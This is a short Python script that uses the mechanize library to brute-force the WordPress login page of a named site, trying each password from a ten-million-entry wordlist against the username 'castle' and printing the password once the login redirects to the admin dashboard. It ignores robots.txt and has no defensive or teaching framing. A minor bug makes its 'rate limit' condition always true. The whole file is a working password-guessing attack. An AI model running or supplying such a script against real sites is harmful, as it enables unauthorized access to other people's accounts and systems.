#!/usr/bin/python

import mechanize 
import itertools
import time

counter = 1

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

pw = open('10Mpass.txt', 'r').readlines()
br.open("http://castledev.org/wp-login.php")
for x in pw:#[:13]
	password = x.strip()       
	br.select_form(nr = 0)
	br.form['log'] = "castle"
	br.form['pwd'] = password
	print "Checking [",counter,"]", br.form['pwd']
	counter += 1
	response=br.submit()
	if counter == 10 or 20:
		time.sleep(1)
	if response.geturl()=="http://castledev.org/wp-admin/index.php":
		#url to which the page is redirected after login
		print "Correct password is ",password
		break
